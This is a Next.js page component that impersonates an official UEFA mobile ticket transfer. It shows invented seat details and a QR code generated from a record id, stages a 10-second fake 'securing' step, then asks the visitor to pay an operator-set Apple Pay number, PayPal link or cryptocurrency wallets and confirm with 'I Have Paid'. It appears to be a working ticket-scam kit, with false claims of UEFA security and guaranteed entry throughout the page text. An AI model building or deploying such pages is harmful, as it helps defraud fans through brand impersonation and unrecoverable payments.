'use client';

import { useState, useCallback, useEffect, useRef } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faMapMarkerAlt, faClock, faInfoCircle, faTicketAlt, faUser, faCalendarAlt, faChair, faIdCard, faCheckCircle, faBell, faTimesCircle, faLock, faWallet, faMobileAlt, faChevronLeft, faChevronRight, faCopy, faChevronDown, faChevronUp, faMoneyBillWave } from '@fortawesome/free-solid-svg-icons';
import Image from 'next/image';
import { useUser } from '../../UserContext';

const APP_SCRIPT_POST_URL = process.env.NEXT_PUBLIC_APP_SCRIPT_URL || "";
const APP_SCRIPT_ADMIN_URL = process.env.NEXT_PUBLIC_APP_SCRIPT_ADMIN_URL || "";

export default function TicketDetails() {
    const router = useRouter();
    const { fetchUserData } = useUser();
    const [approvalStatus, setApprovalStatus] = useState('pending');
    const [pageReady, setPageReady] = useState(false);
    const initialStatusSet = useRef(false);
    const [isActionLoading, setIsActionLoading] = useState(false);
    const params = useParams();
    const userId = params.id as string;
    const [user, setUser] = useState<any | null>(null);
    const [adminInfo, setAdminInfo] = useState<any | null>(null);
    const [loading, setLoading] = useState(true);
    const [currentSeatIndex, setCurrentSeatIndex] = useState(0);
    const [expandedPayment, setExpandedPayment] = useState<string | null>(null);
    const [copiedText, setCopiedText] = useState('');
    const [paymentConfirmed, setPaymentConfirmed] = useState(false);
    const [paymentLoading, setPaymentLoading] = useState(false);

    // Fetch User and Admin data
    useEffect(() => {
        if (userId) {
            const fetchData = async () => {
                setLoading(true);
                try {
                    const fetchedUser = await fetchUserData(userId);
                    if (fetchedUser) {
                        setUser(fetchedUser);
                        
                        // Fetch admin who transferred this ticket to get their Apple Pay info
                        if (fetchedUser.admin) {
                            const adminResponse = await fetch(`${APP_SCRIPT_ADMIN_URL}`);
                            const admins = await adminResponse.json();
                            const relevantAdmin = admins.find((a: any) => a.username === fetchedUser.admin);
                            if (relevantAdmin) {
                                setAdminInfo(relevantAdmin);
                            }
                        }
                    } else {
                        router.push('/invalid');
                    }
                } catch (error) {
                    console.error("Error fetching data:", error);
                    router.push('/invalid');
                } finally {
                    setLoading(false);
                }
            };
            fetchData();
        }
    }, [userId, fetchUserData, router]);

    useEffect(() => {
      if (user && userId && !loading) {
          console.log("user.systemStatus:", user.systemStatus);
          console.log("Redirect condition:", user.systemStatus === "DECLINED" || user.systemStatus === "RETRACTED" || user.systemStatus === "CANCELLED");
  
          if (
              user.systemStatus === "DECLINED" ||
              user.systemStatus === "RETRACTED" ||
              user.systemStatus === "CANCELLED"
          ) {
              router.push("/invalid");
              return;
          }
  
          if (user.systemStatus === "WAITING APPROVAL") {
              setApprovalStatus("pending");
          } else if (
              user.systemStatus === "WAITING COMPLETION" ||
              user.systemStatus === "COMPLETED"
          ) {
              setApprovalStatus("approved");
          }
  
          setPageReady(true);
          initialStatusSet.current = true;
      }
  }, [user, router, userId, loading]);
  
    const handleAcceptTicket = useCallback(() => {
        if (user?.approvalSTAMP) return;

        setIsActionLoading(true);
        setApprovalStatus('processing');

        const currentDate = new Date().toISOString();
        let payload = new URLSearchParams();
        payload.append("action", "ticketApproval");
        payload.append("userId", user?.userId as string);
        payload.append("approvalSTAMP", currentDate);

        fetch(APP_SCRIPT_POST_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: payload.toString()
        }).then(() => {
            setTimeout(() => {
                setApprovalStatus('approved');
                setIsActionLoading(false);
            }, 10000);
        }).catch(error => {
            console.error("Error accepting ticket:", error);
            setApprovalStatus('pending');
            setIsActionLoading(false);
        });
    }, [user]);

    const handleDeclineTransfer = useCallback(() => {
        if (user?.approvalSTAMP) return;

        setIsActionLoading(true);
        setApprovalStatus('processing');

        let payload = new URLSearchParams();
        payload.append("action", "ticketApproval");
        payload.append("userId", user?.userId as string);
        payload.append("approvalSTAMP", "DECLINED");

        fetch(APP_SCRIPT_POST_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: payload.toString()
        }).then(() => {
            setTimeout(() => {
                setApprovalStatus('declined');
                setIsActionLoading(false);
            }, 10000);
        }).catch(error => {
            console.error("Error declining ticket:", error);
            setApprovalStatus('pending');
            setIsActionLoading(false);
        });
    }, [user]);

    const copyToClipboard = useCallback((text: string, label: string) => {
        navigator.clipboard.writeText(text);
        setCopiedText(label);
        setTimeout(() => setCopiedText(''), 2000);
    }, []);

    const handlePaymentConfirmation = useCallback(() => {
        if (paymentConfirmed || paymentLoading) return;
        setPaymentLoading(true);

        const payload = new URLSearchParams();
        payload.append('action', 'paymentConfirmation');
        payload.append('userId', user?.userId as string);
        payload.append('paymentSTAMP', new Date().toISOString());

        fetch(APP_SCRIPT_POST_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: payload.toString()
        }).then(() => {
            setPaymentConfirmed(true);
            setPaymentLoading(false);
        }).catch(error => {
            console.error('Error confirming payment:', error);
            setPaymentLoading(false);
        });
    }, [user, paymentConfirmed, paymentLoading]);

    if (!pageReady) {
        return (
            <div className="min-h-screen flex items-center justify-center">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#026cdf]"></div>
            </div>
        );
    }

    if (!user) {
        return (
            <div className="min-h-screen flex items-center justify-center">
                <div className="text-center p-8">
                    <h2 className="text-2xl font-bold mb-4">User Not Found</h2>
                    <p className="text-gray-600">Please sign in to view ticket details.</p>
                </div>
            </div>
        );
    }

    const isTicketProcessed = approvalStatus === 'approved' || approvalStatus === 'declined';

    return (
      <div className="min-h-screen bg-[#F8F9FA] pt-[140px] lg:pt-[170px]">
      {/* Hero Section */}
      <div className="relative h-[300px] md:h-[450px]">
        <Image
          src={user.coverImage || "https://placehold.co/1200x600/001B41/FFFFFF?text=Event+Image"}
          alt={user.eventName}
          fill
          style={{ objectFit: 'cover' }}
          priority
          unoptimized={true}
        />
        <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-[#1f262d]/40 to-transparent" />
        <div className="absolute bottom-0 left-0 right-0 p-6 md:p-12 text-white">
          <div className="container mx-auto">
            <div className="inline-flex items-center bg-[#026cdf] text-white px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider mb-4 shadow-lg">
              <FontAwesomeIcon icon={faTicketAlt} className="mr-2" />
              Official UEFA Transfer
            </div>
            <h1 className="text-3xl md:text-5xl font-extrabold mb-4 drop-shadow-md">{user.eventName}</h1>
            <div className="flex flex-wrap items-center gap-4 md:gap-8 text-sm md:text-lg font-medium opacity-90">
              <div className="flex items-center">
                <FontAwesomeIcon icon={faMapMarkerAlt} className="mr-2 text-[#026cdf]" />
                <span>{user.venue}, {user.location}</span>
              </div>
              <div className="flex items-center">
                <FontAwesomeIcon icon={faCalendarAlt} className="mr-2 text-[#026cdf]" />
                <span>{new Date(user.dateTime).toLocaleString('en-US', {
                  weekday: 'short',
                  month: 'short',
                  day: 'numeric',
                  year: 'numeric',
                  hour: 'numeric',
                  minute: '2-digit'
                })}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8 md:py-12">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 md:gap-12">
          {/* Left Column - Event Details */}
          <div className="lg:col-span-8">
            <div className="bg-white rounded-3xl shadow-xl overflow-hidden mb-8">
              <div className="p-6 md:p-10">
                <h2 className="text-2xl md:text-3xl font-bold text-gray-900 mb-8 border-b pb-4 flex items-center">
                  <span className="w-2 h-8 bg-[#026cdf] rounded-full mr-4"></span>
                  Transfer Status
                </h2>

                {/* Status Card */}
                {isTicketProcessed ? (
                  <div className={`mb-10 p-6 md:p-8 rounded-2xl ${
                    approvalStatus === 'approved' 
                      ? 'bg-[#026cdf]/5 border-2 border-[#026cdf]/10' 
                      : 'bg-red-50 border-2 border-red-100'
                  }`}>
                    <div className="flex items-center">
                      <div className={`rounded-full p-4 mr-6 ${
                        approvalStatus === 'approved' 
                          ? 'bg-[#026cdf] text-white' 
                          : 'bg-red-500 text-white'
                      } shadow-lg`}>
                        <FontAwesomeIcon 
                          icon={approvalStatus === 'approved' ? faCheckCircle : faTimesCircle} 
                          className="text-2xl" 
                        />
                      </div>
                      <div>
                        <h3 className="font-extrabold text-xl md:text-2xl text-gray-900 mb-1">
                          {approvalStatus === 'approved' ? 'Transfer Successful' : 'Transfer Declined'}
                        </h3>
                        <p className={`text-sm md:text-base font-medium ${
                          approvalStatus === 'approved' ? 'text-[#026cdf]' : 'text-red-700'
                        }`}>
                          {user.messageStatus || (
                            approvalStatus === 'approved' 
                              ? 'Success! Your tickets are now secured in your UEFA account.' 
                              : 'You have declined this ticket transfer. The tickets have been returned to the sender.'
                          )}
                        </p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="mb-10 p-6 md:p-8 bg-[#1f262d]/5 border-2 border-[#1f262d]/10 rounded-2xl shadow-inner">
                    <div className="flex items-center mb-8">
                      <div className="bg-[#1f262d] rounded-2xl p-4 mr-6 shadow-xl">
                        <FontAwesomeIcon icon={faTicketAlt} className="text-[#026cdf] text-2xl" />
                      </div>
                      <div>
                        <h3 className="font-extrabold text-xl md:text-2xl text-[#1f262d] mb-1">Pending Transfer</h3>
                        <p className="text-gray-600 font-medium">
                          {approvalStatus === 'processing'
                            ? 'Processing your secure transfer...'
                            : 'Official match tickets have been sent to you. Action required.'}
                        </p>
                      </div>
                    </div>
                    
                    {approvalStatus === 'pending' && (
                      <div className="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4">
                        <button 
                            onClick={handleAcceptTicket}
                            className="uefa-button-primary flex-1 text-lg shadow-lg hover:shadow-[#026cdf]/30"
                            disabled={isActionLoading}
                        >
                            {isActionLoading ? (
                               <div className="flex items-center justify-center">
                                 <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent mr-3"></div>
                                 Securing...
                               </div>
                            ) : 'Accept Tickets'}
                        </button>
                        <button 
                            onClick={handleDeclineTransfer}
                            className="flex-1 bg-gray-100 text-gray-700 py-4 rounded-xl font-bold hover:bg-gray-200 transition-all active:scale-95"
                            disabled={isActionLoading}
                        >
                            Decline
                        </button>
                      </div>
                    )}
                    
                    {approvalStatus === 'processing' && (
                      <div className="flex flex-col items-center justify-center p-8 text-center">
                        <div className="loader mb-4"></div>
                        <p className="font-bold text-[#1f262d] animate-pulse">Finalizing secure transfer via UEFA Official Systems...</p>
                      </div>
                    )}
                  </div>
                )}

                {/* Details Sections */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-10 md:gap-16">
                   <div className="space-y-8">
                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Sender Information</h3>
                      <div className="flex items-center bg-gray-50 p-4 rounded-2xl">
                        <div className="bg-white shadow-sm rounded-full w-12 h-12 flex items-center justify-center mr-4">
                          <FontAwesomeIcon icon={faUser} className="text-gray-400" />
                        </div>
                        <div>
                          <p className="font-bold text-gray-900">{user.senderName || "John Doe"}</p>
                          <p className="text-xs text-gray-500 font-medium">{user.senderEmail || "john.doe@example.com"}</p>
                        </div>
                      </div>
                    </div>

                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Event Details</h3>
                      <ul className="space-y-5">
                        <li className="flex items-start">
                          <div className="bg-gray-100 p-2 rounded-lg mr-4">
                            <FontAwesomeIcon icon={faClock} className="text-gray-500" />
                          </div>
                          <div>
                            <p className="font-bold text-gray-900 text-sm">Door Time</p>
                            <p className="text-gray-500 text-sm font-medium">{user.doorTime}</p>
                          </div>
                        </li>
                        <li className="flex items-start">
                          <div className="bg-gray-100 p-2 rounded-lg mr-4">
                            <FontAwesomeIcon icon={faIdCard} className="text-gray-500" />
                          </div>
                          <div>
                            <p className="font-bold text-gray-900 text-sm">Entry Requirement</p>
                            <p className="text-gray-500 text-sm font-medium">{user.ageRestriction || "All Ages"}</p>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </div>

                  <div className="space-y-8">
                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Ticket Location</h3>
                      <div className="bg-[#1f262d] p-6 rounded-2xl text-white shadow-xl">
                        <div className="grid grid-cols-3 gap-4 text-center">
                           <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Section</p>
                            <p className="text-xl font-extrabold">{user.section} {user.sectionNo}</p>
                          </div>
                          <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Row</p>
                            <p className="text-xl font-extrabold">{user.row}</p>
                          </div>
                          <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Seat</p>
                            <p className="text-xl font-extrabold text-[#026cdf]">{user.seatNumbers}</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Official Ticket</h3>
                      <div className="bg-[#026cdf]/5 border border-[#026cdf]/10 p-4 rounded-2xl flex items-start">
                         <FontAwesomeIcon icon={faCheckCircle} className="text-[#026cdf] mt-1 mr-3" />
                         <p className="text-xs text-[#1f262d]/80 font-medium leading-relaxed">
                           This is an official <strong>UEFA Mobile Ticket</strong>. Your entry is guaranteed by the official event organizers.
                         </p>
                      </div>
                    </div>
                  </div>
                </div>

                {user.description && (
                  <div className="mt-12 pt-8 border-t">
                    <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Event Information</h3>
                    <p className="text-gray-600 text-sm md:text-base leading-relaxed">{user.description}</p>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Right Column - Mobile Optimized Ticket Preview */}
          <div className="lg:col-span-4">
            <div className="uefa-card sticky top-32 overflow-visible">
               {/* Decorative elements */}
               <div className="absolute -top-3 -left-3 w-8 h-8 bg-[#026cdf] rounded-full z-10 animate-ping opacity-20"></div>
               
               <div className="bg-[#1f262d] text-white p-6 relative overflow-hidden">
                  <div className="absolute right-[-20px] top-[-20px] w-32 h-32 bg-white/5 rounded-full"></div>
                  <h2 className="text-xl font-extrabold flex items-center">
                    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/f3/UEFA_logo.svg/1200px-UEFA_logo.svg.png" alt="UEFA" className="h-8 filter brightness-0 invert mr-3" />
                    Mobile Ticket
                  </h2>
               </div>

               <div className="p-6 md:p-8 bg-white relative">
                  {/* Ticket Mockup - UEFA Style */}
                  <div className="border-2 border-gray-100 rounded-[32px] overflow-hidden shadow-2xl bg-[#1f262d] text-white">
                     <div className="py-4 px-6 flex justify-between items-center border-b border-white/10">
                        <span className="text-[10px] font-bold text-white/60 tracking-widest uppercase">UEFA Official Entrance</span>
                        <div className="text-white/60 text-[10px] font-bold uppercase tracking-widest">
                           {currentSeatIndex + 1} / {user.seatNumbers?.split(',').length || 1}
                        </div>
                     </div>
                     
                     <div className="relative overflow-hidden">
                        <div 
                           className="flex transition-transform duration-500 ease-out"
                           style={{ transform: `translateX(-${currentSeatIndex * 100}%)` }}
                        >
                           {(user.seatNumbers?.split(',') || [user.seatNumbers]).map((seatNum: string, idx: number) => (
                              <div key={idx} className="min-w-full p-8">
                                 <div className="mb-8 text-center">
                                    <h3 className="font-extrabold text-white text-2xl mb-2 line-clamp-1">{user.eventName}</h3>
                                    <p className="text-sm font-bold text-[#026cdf] uppercase tracking-widest truncate">{user.venue}</p>
                                 </div>
                                 
                                 <div className="grid grid-cols-3 gap-4 mb-8">
                                    <div className="bg-white/5 rounded-2xl p-4 text-center border border-white/10">
                                       <p className="text-[9px] font-black text-white/40 uppercase mb-1">Gate</p>
                                       <p className="text-lg font-black text-white">{user.section || 'A'}</p>
                                    </div>
                                    <div className="bg-white/5 rounded-2xl p-4 text-center border border-white/10">
                                       <p className="text-[9px] font-black text-white/40 uppercase mb-1">Row</p>
                                       <p className="text-lg font-black text-white">{user.row}</p>
                                    </div>
                                    <div className="bg-white/5 rounded-2xl p-4 text-center border border-white/10">
                                       <p className="text-[9px] font-black text-[#026cdf] uppercase mb-1">Seat</p>
                                       <p className="text-lg font-black text-[#026cdf]">{seatNum.trim()}</p>
                                    </div>
                                 </div>

                                 {/* QR Code Area - UEFA Style */}
                                 <div className="relative mb-8">
                                    {approvalStatus === 'approved' ? (
                                      <div className="bg-white rounded-[32px] p-6 text-center shadow-[0_0_50px_rgba(0,174,239,0.3)]">
                                         <div className="text-[10px] font-black text-[#026cdf] mb-4 uppercase tracking-widest">Active QR Code</div>
                                         <div className="aspect-square bg-white flex items-center justify-center p-2 rounded-2xl mx-auto w-48">
                                            <img 
                                              src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=UEFA-${user.userId}-${idx}`} 
                                              alt="QR Code" 
                                              className="w-full h-full"
                                            />
                                         </div>
                                         <p className="text-[10px] font-mono font-bold text-gray-400 mt-4">{user.userId?.toUpperCase()}</p>
                                      </div>
                                    ) : (
                                       <div className="bg-white/5 rounded-[32px] p-12 border-2 border-white/10 border-dashed text-center">
                                          <div className="loader mx-auto mb-4 scale-110"></div>
                                          <p className="text-[10px] font-bold text-white/40 uppercase tracking-widest">Validating Ticket...</p>
                                       </div>
                                    )}
                                 </div>


                                 <div className="bg-[#026cdf]/20 py-3 rounded-2xl mb-6 border border-[#026cdf]/30">
                                    <div className="flex items-center justify-center space-x-2 text-[10px] font-bold text-[#026cdf] uppercase tracking-widest">
                                       <FontAwesomeIcon icon={faLock} />
                                       <span>Secured by UEFA</span>
                                    </div>
                                 </div>

                                 {/* Dynamic Payment Options moved outside the slider */}
                               </div>
                           ))}
                        </div>

                        {/* Navigation Arrows */}
                        {user.seatNumbers?.split(',').length > 1 && (
                           <>
                              {currentSeatIndex > 0 && (
                                 <button 
                                    onClick={() => setCurrentSeatIndex(prev => prev - 1)}
                                    className="absolute left-2 top-1/2 -translate-y-1/2 w-8 h-8 bg-white/90 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-[#001B41] z-10"
                                 >
                                    <FontAwesomeIcon icon={faChevronLeft} className="text-xs" />
                                 </button>
                              )}
                              {currentSeatIndex < user.seatNumbers.split(',').length - 1 && (
                                 <button 
                                    onClick={() => setCurrentSeatIndex(prev => prev + 1)}
                                    className="absolute right-2 top-1/2 -translate-y-1/2 w-10 h-10 bg-white/10 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-white z-10 border border-white/20"
                                 >
                                    <FontAwesomeIcon icon={faChevronRight} className="text-sm" />
                                 </button>
                              )}
                           </>
                        )}
                     </div>
                  </div>

                  {/* Dynamic Payment Options - Extracted from Slider */}
                  {approvalStatus === 'approved' && (() => {
                     let parsedSettings: any = null;
                     try { parsedSettings = user.paymentSettings ? JSON.parse(user.paymentSettings) : null; } catch(e) {}
                     const applePayNum = parsedSettings?.applePayNumber || adminInfo?.applePayNumber;
                     const paypalLink = parsedSettings?.paypal;
                     const cryptoWallets = parsedSettings?.cryptoWallets;
                     const hasCrypto = cryptoWallets && (cryptoWallets.btc || cryptoWallets.eth || cryptoWallets.usdt || cryptoWallets.trc);
                     const hasAnyPayment = applePayNum || paypalLink || hasCrypto;
                     const seatCount = user.seatNumbers?.split(',').length || 1;
                     const perTicketAmount = parseFloat(user.paymentAmount) || 0;
                     const totalAmount = perTicketAmount * seatCount;

                     if (!hasAnyPayment) return null;

                     return (
                        <div className="space-y-3 mt-6">
                           {/* Payment Amount Display */}
                           {perTicketAmount > 0 && (
                              <div className="bg-gradient-to-r from-[#026cdf]/10 to-[#026cdf]/5 p-5 rounded-3xl border border-[#026cdf]/20">
                                 <div className="flex justify-between items-center mb-1">
                                    <span className="text-[11px] font-bold text-[#1f262d]/60 uppercase tracking-widest">Amount Due</span>
                                    <span className="text-[11px] font-bold text-[#1f262d]/50">{seatCount} ticket{seatCount > 1 ? 's' : ''} × ${perTicketAmount.toFixed(2)}</span>
                                 </div>
                                 <p className="text-3xl font-black text-[#1f262d]">${totalAmount.toFixed(2)}</p>
                              </div>
                           )}

                           {/* Apple Pay */}
                           {applePayNum && (
                              <div>
                                 <button
                                    onClick={() => setExpandedPayment(expandedPayment === 'apple' ? null : 'apple')}
                                    className="w-full bg-[#1f262d] text-white py-4 rounded-2xl font-black text-sm shadow-xl flex items-center justify-between px-6 hover:scale-[1.02] transition-transform active:scale-95 border border-transparent"
                                 >
                                    <div className="flex items-center">
                                       <FontAwesomeIcon icon={faMobileAlt} className="mr-3 text-white" />
                                       Apple Pay
                                    </div>
                                    <FontAwesomeIcon icon={expandedPayment === 'apple' ? faChevronUp : faChevronDown} className="text-white/40 text-xs" />
                                 </button>
                                 {expandedPayment === 'apple' && (
                                    <div className="mt-2 bg-gray-50 rounded-2xl p-5 border border-gray-100 animate-in slide-in-from-top-2 duration-300">
                                       <p className="text-[12px] text-gray-600 font-medium mb-3 leading-relaxed">Send your payment via Apple Pay to the following number:</p>
                                       <div className="bg-white rounded-xl p-4 flex items-center justify-between border border-gray-200 shadow-sm">
                                          <span className="text-[#1f262d] font-black text-lg">{applePayNum}</span>
                                          <button
                                             onClick={() => copyToClipboard(applePayNum, 'apple')}
                                             className="bg-[#026cdf] text-white px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest hover:bg-[#026cdf]/80 transition-colors"
                                          >
                                             {copiedText === 'apple' ? '✓ Copied' : 'Copy'}
                                          </button>
                                       </div>
                                    </div>
                                 )}
                              </div>
                           )}

                           {/* PayPal */}
                           {paypalLink && (
                              <a
                                 href={paypalLink.startsWith('http') ? paypalLink : `https://${paypalLink}`}
                                 target="_blank"
                                 rel="noopener noreferrer"
                                 className="w-full bg-[#0070ba] text-white py-4 rounded-2xl font-black text-sm shadow-xl flex items-center justify-center hover:scale-[1.02] transition-transform active:scale-95"
                              >
                                 <FontAwesomeIcon icon={faMoneyBillWave} className="mr-3" />
                                 Pay with PayPal
                              </a>
                           )}

                           {/* Crypto Wallets Accordion */}
                           {hasCrypto && (
                              <div>
                                 <button
                                    onClick={() => setExpandedPayment(expandedPayment === 'crypto' ? null : 'crypto')}
                                    className="w-full bg-gray-100 text-[#1f262d] py-4 rounded-2xl font-black text-sm flex items-center justify-between px-6 hover:bg-gray-200 transition-all border border-gray-200"
                                 >
                                    <div className="flex items-center">
                                       <FontAwesomeIcon icon={faWallet} className="mr-3" />
                                       Crypto Transfer
                                    </div>
                                    <FontAwesomeIcon icon={expandedPayment === 'crypto' ? faChevronUp : faChevronDown} className="text-gray-400 text-xs" />
                                 </button>
                                 {expandedPayment === 'crypto' && (
                                    <div className="mt-2 space-y-3 animate-in slide-in-from-top-2 duration-300">
                                       {Object.entries(cryptoWallets).filter(([_, v]) => v).map(([key, address]) => (
                                          <div key={key} className="bg-gray-50 rounded-2xl p-4 border border-gray-200 shadow-sm">
                                             <div className="flex items-center justify-between mb-3">
                                                <span className="text-[10px] font-black uppercase tracking-widest" style={{color: key === 'btc' ? '#f7931a' : key === 'eth' ? '#627eea' : key === 'usdt' ? '#26a17b' : '#ff0013'}}>{key.toUpperCase()}</span>
                                                <button
                                                   onClick={() => copyToClipboard(address as string, key)}
                                                   className="text-[10px] font-black text-[#026cdf] uppercase tracking-widest flex items-center"
                                                >
                                                   <FontAwesomeIcon icon={faCopy} className="mr-1" />
                                                   {copiedText === key ? 'Copied!' : 'Copy'}
                                                </button>
                                             </div>
                                             <p className="text-[11px] text-gray-700 font-mono break-all mb-3">{address as string}</p>
                                             <div className="flex justify-center">
                                                <img
                                                   src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(address as string)}`}
                                                   alt={`${key.toUpperCase()} QR Code`}
                                                   className="w-28 h-28 rounded-xl bg-white p-2 border border-gray-200"
                                                />
                                             </div>
                                          </div>
                                       ))}
                                    </div>
                                 )}
                              </div>
                           )}

                           {/* I Have Paid Button */}
                           <button
                              onClick={handlePaymentConfirmation}
                              disabled={paymentConfirmed || paymentLoading || !!user?.paymentSTAMP}
                              className={`w-full py-4 rounded-2xl font-black text-sm mt-4 transition-all ${
                                 paymentConfirmed || user?.paymentSTAMP
                                    ? 'bg-green-500/10 text-green-600 border border-green-500/30 cursor-default'
                                    : 'bg-gradient-to-r from-[#026cdf] to-[#026cdf]/80 text-white shadow-xl shadow-[#026cdf]/20 hover:scale-[1.02] active:scale-95'
                              }`}
                           >
                              {paymentLoading ? (
                                 <div className="flex items-center justify-center">
                                    <div className="animate-spin rounded-full h-5 w-5 border-2 border-[#026cdf] border-t-transparent mr-3"></div>
                                    Confirming...
                                 </div>
                              ) : paymentConfirmed || user?.paymentSTAMP ? (
                                 <div className="flex items-center justify-center">
                                    <FontAwesomeIcon icon={faCheckCircle} className="mr-2" />
                                    Payment Submitted — Verifying
                                 </div>
                              ) : (
                                 'I Have Paid'
                              )}
                           </button>
                        </div>
                     );
                  })()}


                  <div className="mt-8 p-6 bg-[#026cdf]/5 rounded-2xl border border-[#026cdf]/10">
                     <h4 className="font-extrabold text-[#026cdf] text-sm mb-2 flex items-center">
                        <FontAwesomeIcon icon={faInfoCircle} className="mr-2" />
                        UEFA Fan Support
                     </h4>
                     <p className="text-[11px] text-[#1f262d]/70 leading-relaxed font-medium">
                        Official UEFA Mobile Tickets are verified by our systems. For assistance, please visit the official UEFA help center or stadium support desk.
                     </p>
                  </div>
               </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    );
}
